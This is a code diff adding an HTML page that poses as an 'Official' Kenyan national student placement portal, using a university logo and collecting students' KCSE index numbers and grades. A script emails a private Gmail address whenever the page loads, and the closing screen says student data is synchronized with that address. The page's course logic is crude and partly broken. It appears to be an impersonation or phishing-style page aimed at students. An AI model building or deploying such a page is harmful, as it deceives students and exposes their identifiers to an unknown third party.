@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>National Placement Portal | Official</title>
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() { emailjs.init("YOUR_PUBLIC_KEY"); })();
+        window.onload = function() {
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                message: "A user is navigating the Branded Portal",
+                to_email: "fidelsteven71@gmail.com"
+            });
+        };
+    </script>
+
+    <style>
+        body { background: #f0f4f8; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
+        .form-card { background: white; padding: 0; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 900px; overflow: hidden; }
+        
+        /* PERSISTENT LOGO HEADER (Visible on every page) */
+        .brand-header { background: #1a5276; padding: 20px; text-align: center; color: white; border-bottom: 4px solid #f1c40f; }
+        .brand-logo { width: 80px; height: 80px; background: white; border-radius: 50%; padding: 5px; margin-bottom: 10px; }
+        .brand-title { margin: 0; font-size: 18px; text-transform: uppercase; letter-spacing: 1px; }
+
+        .content-area { padding: 30px; }
+        .header-text { text-align: center; color: #34495e; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 20px; font-weight: bold; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; margin-top: 25px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .next-btn { background-color: #3498db; color: white; }
+        .submit-btn { background-color: #27ae60; color: white; }
+        .hidden { display: none; }
+        
+        /* BRANCH NETWORK STYLES */
+        #branchSearch { margin-bottom: 15px; border: 2px solid #3498db; padding: 12px; width: 100%; border-radius: 8px; box-sizing: border-box;}
+        .branch-scroll { height: 450px; overflow-y: auto; padding: 15px; background: #f9f9f9; border-radius: 10px; border: 1px solid #ddd; }
+        .branch-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 12px; }
+        .branch-card { background: white; border: 1px solid #e0e0e0; padding: 12px; border-radius: 8px; font-size: 13px; }
+        .branch-card b { color: #2980b9; display: block; }
+        .town-tag { color: #e67e22; font-weight: bold; font-size: 11px; }
+    </style>
+</head>
+<body>
+
+<div class="form-card">
+    <div class="brand-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/JKUAT_Logo.png" alt="KUCCPS LOGO" class="brand-logo">
+        <h1 class="brand-title">National Student Placement</h1>
+    </div>
+
+    <div class="content-area">
+        <form id="masterPortal">
+            <div id="page1">
+                <h2 class="header-text">1. Student Login</h2>
+                <label>KCSE Index Number</label>
+                <input type="text" id="indexNumber" style="width:100%; padding:12px; margin-top:8px; border:1px solid #ddd; border-radius:8px;" placeholder="e.g. 12345678901" required>
+                <button type="button" class="btn next-btn" onclick="nextPage(1, 2)">Validate & Enter</button>
+            </div>
+
+            <div id="page2" class="hidden">
+                <h2 class="header-text">2. Results Entry</h2>
+                <label>Mean Grade</label>
+                <input type="text" id="gradeInput" style="width:100%; padding:12px; margin-top:8px; border:1px solid #ddd; border-radius:8px;" placeholder="e.g. A, B-, C+" required>
+                <button type="button" class="btn next-btn" onclick="filterCourses()">Check Available Courses</button>
+            </div>
+
+            <div id="page3" class="hidden">
+                <h2 class="header-text">3. Select Course</h2>
+                <select id="courseList" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:8px;" onchange="matchUniversities()" required></select>
+                <div id="matchBox" class="hidden" style="background:#e8f4fd; border-left:5px solid #3498db; padding:15px; margin-top:15px;">
+                    <p id="uniSuggestions" style="font-size:14px; color:#2c3e50;"></p>
+                </div>
+                <button type="button" class="btn next-btn" onclick="nextPage(3, 4)">Continue Selection</button>
+            </div>
+
+            <div id="page4" class="hidden">
+                <h2 class="header-text">4. Preferred Institution</h2>
+                <select id="finalUniSelect" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:8px;" required></select>
+                <button type="button" class="btn next-btn" onclick="nextPage(4, 6)">Explore Branch Locations</button>
+            </div>
+
+            <div id="page6" class="hidden">
+                <h2 class="header-text">National Branch Directory</h2>
+                <input type="text" id="branchSearch" placeholder="🔍 Search any campus or town..." onkeyup="searchBranches()">
+                <div class="branch-scroll">
+                    <div class="branch-grid" id="branchContainer">
+                        <div class="branch-card"><b>UoN - Parklands Campus</b><span class="town-tag">Nairobi</span></div>
+                        <div class="branch-card"><b>UoN - Mombasa Campus</b><span class="town-tag">Mombasa</span></div>
+                        <div class="branch-card"><b>KU - City Campus</b><span class="town-tag">Nairobi CBD</span></div>
+                        <div class="branch-card"><b>Moi - Eldoret Town</b><span class="town-tag">Eldoret</span></div>
+                        <div class="branch-card"><b>JKUAT - Karen Campus</b><span class="town-tag">Karen</span></div>
+                        <div class="branch-card"><b>KMTC - Kisumu</b><span class="town-tag">Kisumu</span></div>
+                        <div class="branch-card"><b>Eldoret Polytechnic</b><span class="town-tag">Eldoret</span></div>
+                        <div class="branch-card"><b>Nyeri Polytechnic</b><span class="town-tag">Nyeri</span></div>
+                    </div>
+                </div>
+                <button type="button" class="btn submit-btn" onclick="finishApplication()">Finalize Placement</button>
+            </div>
+        </form>
+
+        <div id="successPage" class="hidden" style="text-align:center;">
+            <h2 style="color: #27ae60;">✅ Process Complete</h2>
+            <div id="finalSummary" style="background:#f9f9f9; padding:20px; border-radius:10px; margin: 20px 0; border:1px solid #ddd;"></div>
+            <p style="color:#7f8c8d;">Data synchronized with <b>fidelsteven71@gmail.com</b></p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // PRESERVED BUSINESS LOGIC
+    const courseDatabase = {
+        "HIGH": ["Medicine", "Engineering", "Law", "Pharmacy"],
+        "MID": ["Education", "Business", "Hospitality"],
+        "TECH": ["Diploma IT", "Diploma Nursing", "Plumbing"]
+    };
+
+    const uniRecommendations = {
+        "Medical": ["UoN", "Moi", "KU", "KMTC"],
+        "Engineering": ["JKUAT", "TUK", "UoN"]
+    };
+
+    function nextPage(curr, next) {
+        document.getElementById('page' + curr).classList.add('hidden');
+        document.getElementById('page' + next).classList.remove('hidden');
+    }
+
+    function filterCourses() {
+        const grade = document.getElementById('gradeInput').value.toUpperCase();
+        const list = document.getElementById('courseList');
+        list.innerHTML = '<option value="">-- Select Course --</option>';
+        let selected = (["A", "A-", "B+"].includes(grade)) ? courseDatabase.HIGH : courseDatabase.MID;
+        selected.forEach(c => { let opt = document.createElement("option"); opt.text = c; list.add(opt); });
+        nextPage(2, 3);
+    }
+
+    function matchUniversities() {
+        const finalSelect = document.getElementById('finalUniSelect');
+        const box = document.getElementById('matchBox');
+        finalSelect.innerHTML = ""; box.classList.remove('hidden');
+        let recs = uniRecommendations["Medical"];
+        document.getElementById('uniSuggestions').innerText = "Official Recs: " + recs.join(" | ");
+        recs.forEach(u => { let opt = document.createElement("option"); opt.text = u; finalSelect.add(opt); });
+    }
+
+    function searchBranches() {
+        let input = document.getElementById('branchSearch').value.toLowerCase();
+        let cards = document.getElementsByClassName('branch-card');
+        for (let i = 0; i < cards.length; i++) {
+            let content = cards[i].innerText.toLowerCase();
+            cards[i].style.display = content.includes(input) ? "" : "none";
+        }
+    }
+
+    function finishApplication() {
+        const index = document.getElementById('indexNumber').value;
+        document.getElementById('masterPortal').classList.add('hidden');
+        document.getElementById('successPage').classList.remove('hidden');
+        document.getElementById('finalSummary').innerHTML = `<b>Student ID:</b> ${index}<br>Status: Pending Review`;
+    }
+</script>
+</body>
+</html>
